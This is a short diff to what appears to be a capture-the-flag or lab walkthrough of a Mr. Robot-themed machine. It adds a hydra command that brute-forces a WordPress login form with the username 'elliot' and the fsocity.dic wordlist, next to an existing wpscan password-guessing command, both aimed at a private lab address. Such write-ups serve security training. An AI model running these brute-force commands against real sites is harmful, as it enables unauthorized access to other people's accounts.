@@ -52,6 +52,7 @@ Used `fsocity.dic` as username and password wordlist.
 
 ```
 bash
+hydra -l elliot -P fsocity.dic 192.168.215.5 http-post-form "wp-login.php:log=^USER^&pwd=^PASS^:The Password" -vV
 wpscan --url http://192.168.215.5 --usernames admin --passwords fsocity.dic
 ```
 
